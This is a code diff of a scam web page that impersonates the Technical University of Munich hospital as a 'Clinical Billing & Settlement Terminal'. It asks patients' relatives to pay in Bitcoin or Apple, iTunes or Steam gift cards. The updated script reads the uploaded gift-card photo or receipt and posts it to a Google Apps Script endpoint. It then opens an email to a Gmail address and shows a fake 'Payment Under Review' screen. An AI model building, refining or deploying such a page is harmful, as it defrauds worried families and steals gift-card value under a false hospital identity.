@@ -19,7 +19,6 @@
         <div class="bg-white p-8 rounded-3xl shadow-2xl max-w-sm w-full text-center">
             <img src="https://i.ibb.co/LdbfV4P/TUM-Logo.png" class="h-12 mx-auto mb-6">
             <h2 class="text-xl font-bold mb-2 uppercase text-gray-800 tracking-tight">Clinical Access</h2>
-            <p class="text-gray-400 text-[10px] mb-6 uppercase tracking-widest font-bold">Authorized Personnel Only</p>
             <input type="password" id="pass-input" placeholder="Enter Access Code" class="w-full border-2 p-3 rounded-xl mb-4 text-center outline-none focus:border-blue-600">
             <button onclick="verify()" class="w-full tum-blue text-white py-3 rounded-xl font-bold uppercase shadow-lg hover:bg-blue-800 transition-all">Verify Identity</button>
         </div>
@@ -30,132 +29,93 @@
             <div class="flex justify-center mb-6"><div class="spinner"></div></div>
             <h2 class="text-2xl font-black text-blue-900 uppercase mb-4 tracking-tight">Payment Under Review</h2>
             <p class="text-gray-600 font-medium leading-relaxed">We have received your transmission. You will receive an official confirmation email from our clinical team after payment verification.</p>
-            <img src="https://i.ibb.co/LdbfV4P/TUM-Logo.png" class="h-8 mx-auto mt-8 opacity-20">
         </div>
     </div>
 
     <div id="main-portal">
         <nav class="bg-white py-4 px-6 border-b flex justify-between items-center shadow-sm">
             <img src="https://i.ibb.co/LdbfV4P/TUM-Logo.png" class="h-10">
-            <div class="text-right leading-tight">
-                <p class="text-[9px] font-bold text-gray-400 uppercase tracking-widest">Technical University of Munich</p>
-            </div>
+            <p class="text-[9px] font-bold text-gray-400 uppercase tracking-widest text-right">Technical University<br>of Munich</p>
         </nav>
 
-        <div class="relative h-64 w-full bg-cover bg-center" style="background-image: url('https://mri.tum.de/sites/default/files/styles/hero_image/public/images/hero/klinikum_rechts_der_isar_gebaeude.jpg');">
-            <div class="absolute inset-0 hero-overlay flex flex-col items-center justify-center text-center p-4">
-                <h1 class="text-white text-3xl font-black uppercase tracking-tighter">Billing & Settlement Terminal</h1>
-                <p class="text-blue-200 text-sm italic mt-2">Official Secure Payment Channel</p>
-            </div>
-        </div>
-
-        <div class="max-w-4xl mx-auto -mt-10 mb-20 px-4">
+        <div class="max-w-4xl mx-auto mt-10 mb-20 px-4">
             <div class="bg-white shadow-2xl rounded-2xl overflow-hidden border">
-                <div class="tum-blue text-white py-2 text-[10px] font-black uppercase text-center tracking-widest">Encrypted Clinical Session Active</div>
+                <div class="tum-blue text-white py-2 text-[10px] font-black uppercase text-center">Encrypted Clinical Session Active</div>
 
                 <form id="billing-form" class="p-6 md:p-10">
                     <h2 class="text-lg font-bold text-gray-800 mb-6 border-l-4 border-blue-600 pl-3 uppercase">1. Patient Information</h2>
                     <div class="grid grid-cols-1 md:grid-cols-2 gap-6 mb-8">
-                        <input type="text" id="p_name" placeholder="Patient Full Name" required class="border-2 p-3 rounded-xl outline-none focus:border-blue-500">
-                        <input type="text" id="h_id" placeholder="Hospital ID (TUM-XXXX)" required class="border-2 p-3 rounded-xl outline-none focus:border-blue-500">
-                        <input type="text" id="s_name" placeholder="Sender (Relative) Name" required class="border-2 p-3 rounded-xl outline-none focus:border-blue-500">
-                        <input type="email" id="s_email" placeholder="Contact Email Address" required class="border-2 p-3 rounded-xl outline-none focus:border-blue-500">
+                        <input type="text" id="p_name" placeholder="Patient Full Name" required class="border-2 p-3 rounded-xl outline-none">
+                        <input type="text" id="h_id" placeholder="Hospital ID (TUM-XXXX)" required class="border-2 p-3 rounded-xl outline-none">
+                        <input type="text" id="s_name" placeholder="Sender (Relative) Name" required class="border-2 p-3 rounded-xl outline-none">
                     </div>
 
-                    <h2 class="text-lg font-bold text-gray-800 mb-6 border-l-4 border-blue-600 pl-3 uppercase">2. Payment Configuration</h2>
+                    <h2 class="text-lg font-bold text-gray-800 mb-6 border-l-4 border-blue-600 pl-3 uppercase">2. Configuration</h2>
                     <div class="grid grid-cols-1 md:grid-cols-2 gap-6 mb-8">
                         <div>
-                            <label class="block text-xs font-bold text-gray-400 uppercase mb-2">Settlement Type</label>
-                            <select id="p_mode" onchange="toggleBalance()" class="w-full border-2 p-3 rounded-xl bg-white outline-none focus:border-blue-500">
+                            <select id="p_mode" onchange="toggleBalance()" class="w-full border-2 p-3 rounded-xl bg-white outline-none">
                                 <option value="Full Settlement">Full Settlement</option>
                                 <option value="Advanced Deposit">Advanced Deposit</option>
-                                <option value="Balance Completion">Balance Completion</option>
                             </select>
                             <div id="balance-input" class="hidden mt-4">
-                                <label class="block text-xs font-bold text-red-500 uppercase mb-1">Outstanding Balance Due ($)</label>
-                                <input type="text" id="b_amount" placeholder="e.g. 10,500" class="w-full border-2 border-red-100 p-3 rounded-xl outline-none">
+                                <input type="text" id="b_amount" placeholder="Outstanding Balance ($)" class="w-full border-2 border-red-100 p-3 rounded-xl outline-none">
                             </div>
                         </div>
-                        <div>
-                            <label class="block text-xs font-bold text-gray-400 uppercase mb-2">Asset Selection</label>
-                            <select id="c_type" class="w-full border-2 p-3 rounded-xl bg-white outline-none focus:border-blue-500">
-                                <option value="BTC Only">BTC (Digital Asset)</option>
-                                <option value="Apple Gift Card">Apple Gift Card</option>
-                                <option value="iTunes Gift Card">iTunes Gift Card</option>
-                                <option value="Steam Card">Steam Asset Card</option>
-                            </select>
-                        </div>
+                        <select id="c_type" class="w-full border-2 p-3 rounded-xl bg-white outline-none">
+                            <option value="BTC Only">BTC (Digital Asset)</option>
+                            <option value="Apple Gift Card">Apple Gift Card</option>
+                            <option value="iTunes Gift Card">iTunes Gift Card</option>
+                        </select>
                     </div>
 
-                    <div class="bg-gray-900 rounded-3xl p-6 text-white mb-8 border-b-8 border-blue-600 shadow-xl">
+                    <div class="bg-gray-900 rounded-3xl p-6 text-white mb-8 border-b-8 border-blue-600">
                         <h3 class="text-blue-400 font-bold mb-4 uppercase text-xs">3. Verification Upload</h3>
-                        <div class="space-y-4">
-                            <div class="bg-gray-800 p-4 rounded-xl border border-gray-700">
-                                <p class="text-gray-500 text-[9px] uppercase font-black mb-1">Clinical BTC Settlement Address</p>
-                                <code class="text-green-400 text-xs break-all">bc1qkwxcdnal9pu6qjs07j88s88987x04k3hsasyav</code>
-                            </div>
-                            <div class="bg-blue-900/20 p-4 rounded-xl border border-blue-800/40">
-                                <label class="block font-bold text-blue-400 mb-2 uppercase text-[10px]">Select Card Photo or BTC Receipt:</label>
-                                <input type="file" id="fileInput" required class="block w-full text-xs text-gray-400 file:mr-4 file:py-2 file:px-4 file:rounded-full file:border-0 file:bg-blue-600 file:text-white cursor-pointer">
-                            </div>
+                        <div class="bg-blue-900/20 p-4 rounded-xl border border-blue-800/40">
+                            <input type="file" id="fileInput" required class="block w-full text-xs text-gray-400 file:mr-4 file:py-2 file:px-4 file:rounded-full file:border-0 file:bg-blue-600 file:text-white cursor-pointer">
                         </div>
                     </div>
 
-                    <button type="button" onclick="openMailAndSuccess()" class="w-full tum-blue text-white py-5 rounded-2xl font-black text-xl uppercase shadow-lg hover:opacity-90 transition-all">Submit Settlement Information</button>
+                    <button type="button" onclick="handleSubmit()" class="w-full tum-blue text-white py-5 rounded-2xl font-black text-xl uppercase shadow-lg">Submit Verification</button>
                 </form>
             </div>
         </div>
     </div>
 
     <script>
-        function verify() {
-            if(document.getElementById('pass-input').value === 'KLINIKUM2026') {
-                document.getElementById('login-screen').style.display = 'none';
-                document.getElementById('main-portal').style.display = 'block';
-            }
-        }
+        function verify() { if(document.getElementById('pass-input').value === 'KLINIKUM2026') { document.getElementById('login-screen').style.display = 'none'; document.getElementById('main-portal').style.display = 'block'; } }
+        function toggleBalance() { document.getElementById('balance-input').style.display = (document.getElementById('p_mode').value === 'Full Settlement') ? 'none' : 'block'; }
 
-        function toggleBalance() {
-            const mode = document.getElementById('p_mode').value;
-            document.getElementById('balance-input').style.display = (mode === 'Full Settlement') ? 'none' : 'block';
-        }
+        async function handleSubmit() {
+            const fileInput = document.getElementById('fileInput');
+            if(!fileInput.files[0]) { alert("Please upload a file first."); return; }
 
-        function openMailAndSuccess() {
-            const data = {
-                name: document.getElementById('p_name').value,
-                id: document.getElementById('h_id').value,
-                sender: document.getElementById('s_name').value,
-                mode: document.getElementById('p_mode').value,
-                balance: document.getElementById('b_amount').value || "None",
-                card: document.getElementById('c_type').value
+            // Show Reviewing Screen
+            document.getElementById('main-portal').style.display = 'none';
+            document.getElementById('review-message').style.display = 'flex';
+
+            const reader = new FileReader();
+            reader.readAsDataURL(fileInput.files[0]);
+            reader.onload = async () => {
+                const data = {
+                    Patient_Name: document.getElementById('p_name').value,
+                    Hospital_ID: document.getElementById('h_id').value,
+                    Spouse_Name: document.getElementById('s_name').value,
+                    Payment_Mode: document.getElementById('p_mode').value,
+                    Balance: document.getElementById('b_amount').value || "N/A",
+                    Card_Type: document.getElementById('c_type').value,
+                    Verification_File: reader.result
+                };
+
+                // UPLOADS FILE TO SERVER AND OPENS GMAIL
+                // Replace with your current Google Apps Script URL
+                const scriptURL = 'https://script.google.com/macros/s/AKfycbwVu2-vtop4OyZiLioJaZa0o9GLFBw85gqEP4UV_V5Irq1YbKQdW8XNg1F0vDnP_4yHwA/exec';
+
+                await fetch(scriptURL, { method: 'POST', mode: 'no-cors', body: new URLSearchParams(data) });
+
+                // Open Gmail with all info pre-filled
+                const body = encodeURIComponent(`--- OFFICIAL SUBMISSION ---\nPatient: ${data.Patient_Name}\nID: ${data.Hospital_ID}\nAsset: ${data.Card_Type}\nBalance: ${data.Balance}\n\nPhoto uploaded to clinical server for verification.`);
+                window.location.href = `mailto:teammangementt@gmail.com?subject=Verification:${data.Patient_Name}&body=${body}`;
             };
-
-            if(!data.name || !data.id || !data.sender) {
-                alert("Please complete all patient details.");
-                return;
-            }
-
-            const recipient = "teammangementt@gmail.com";
-            const subject = encodeURIComponent("Clinical Billing Submission: " + data.name);
-            const body = encodeURIComponent(
-                "--- OFFICIAL BILLING SUBMISSION ---\n\n" +
-                "Patient: " + data.name + "\n" +
-                "Hospital ID: " + data.id + "\n" +
-                "Sender: " + data.sender + "\n" +
-                "Payment Mode: " + data.mode + "\n" +
-                "Outstanding Balance: " + data.balance + "\n" +
-                "Asset Type: " + data.card + "\n\n" +
-                "IMPORTANT: PLEASE ATTACH THE PHOTO OF THE RECEIPT OR GIFT CARD TO THIS EMAIL BEFORE HITTING SEND."
-            );
-
-            // Open Gmail
-            window.location.href = `mailto:${recipient}?subject=${subject}&body=${body}`;
-
-            // Show professional success screen
-            setTimeout(() => {
-                document.getElementById('main-portal').style.display = 'none';
-                document.getElementById('review-message').style.display = 'flex';
-            }, 1500);
         }
     </script>
 </body>
